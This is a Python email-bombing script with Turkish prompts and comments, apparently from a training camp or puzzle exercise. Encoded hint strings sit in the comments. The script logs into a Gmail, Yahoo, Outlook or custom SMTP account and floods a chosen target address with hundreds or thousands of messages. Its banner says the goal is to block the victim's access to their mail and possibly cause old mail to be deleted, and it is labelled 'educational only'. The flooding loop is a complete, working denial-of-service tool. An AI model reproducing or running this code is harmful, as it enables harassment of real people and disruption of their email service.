import smtplib
import sys
import os
os.system("clear")

#Kodumda bir hata olmalı, kamptan sonra düzeltirim ben bunu
#Kodumda bir hata olmalı, kamptan sonra düzeltirim ben bunu
#Kodumda bir hata olmalı, kamptan sonra düzeltirim ben bunu


class bcolors:
    GREEN = '\033[92m'
    #Green = '\V2pOS2JGcFhORDA9'
    YELLOW = '\033[93m'
    #Yellow = \WlZkV2MySkhPVE09'
    RED = '\033[91m'
    #Red = '\RG9ncnUgeW9sZGFzaW4h' 


def banner():
    print(bcolors.GREEN + '\n\n\t\t\t\t\t\t---eMail Saldırganı---')
    print(bcolors.GREEN + '''
        Bu program hedef maile belirtilen sayıca mail göndererek kurbanın kendi maillerine erişmesini engellemek 
        hatta kurbanın kullandığı mail servisine bağlı olarak aşırı yükleme sebebiyle eski maillerini silebilirsiniz.

        YASAL UYARI: BU SİSTEM TAMAMEN EĞİTİM AMAÇLI OLARAK ÜRETİLMİŞTİR, EĞİTİM HARİCİ KULLANILAMAZ!!!

        Geliştirici: Sibel Kampçı
                     ''')


class Email_Dos:   #!
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n-----Program Kurulumu-----')
            self.target = str(input(bcolors.GREEN + 'Hedef mail adresi : '))
            self.mode = int(input(bcolors.GREEN + 'Saldırı modunu seçiniz (1 = 1000, 2 = 500, 3 = 250, 4 = özel) : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('HATA: Yanlış seçenek seçildi.')
                print('\n\nProgram kapatılıyor...\n\n\n')
                sys.exit(1)
        except Exception as e:
            print(f'HATA: {e}')

    def set_Attack(self):
        try:
            print(bcolors.RED + '\n-----Saldırının ayarlanması-----')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Saldırı sayısını giriniz : '))
            print(bcolors.GREEN + f'\nSeçilen saldırı modu: {self.mode} ve saldırı sayısı: {self.amount}')
        except Exception as e:
            print(f'HATA: {e}')

    def set_Email(self):
        try:
            print(bcolors.RED + '\n-----Saldırı yapacak mailin ayarlanması-----')
            self.server = str(input(bcolors.GREEN + 'Kendi mail server`ınızı giriniz VEYA ön ayarlı mail servislerinden seçiniz - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Port numarasını giriniz : '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Saldırıyı yapacak mail adresini giriniz : '))
            self.fromPwd = str(input(bcolors.GREEN + 'Saldırgan maile ait şifreyi giriniz : '))
            self.subject = str(input(bcolors.GREEN + 'Konu başlığını giriniz : '))
            self.message = str(input(bcolors.GREEN + 'Mesaj içeriğini giriniz : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'HATA: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'Gerçekleşen saldırı sayısı: {self.count}')
        except Exception as e:
            print(f'HATA: {e}')

    def attack(self):
        print(bcolors.RED + '\nSaldırılıyor...')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + '\nSaldırı tamamlandı...')
        sys.exit(0)

        #01100001 01001000 01010010 00110000 01100011 01001000 01001101 00110110 01001100 01111001 00111001 00110011 01100100 00110011 01100011 01110101 01100101 01010111 00111001 00110001 01100100 01001000 01010110 01101001 01011010 01010011 00110101 01101010 01100010 00110010 00110000 01110110 01100100 00110010 01000110 00110000 01011001 00110010 01100111 00101111 01100100 01101010 00110001 01001001 01010010 00110000 00111001 00110000 01010010 00110000 01000110 01110110 01001110 00110001 01110000 01010110 01010111 01010001 00111101 00111101


if __name__=='__main__':
    banner()
    bomb = Email_Dos() #!
    bomb.set_Attack()
    bomb.set_Email()
    bomb.attack()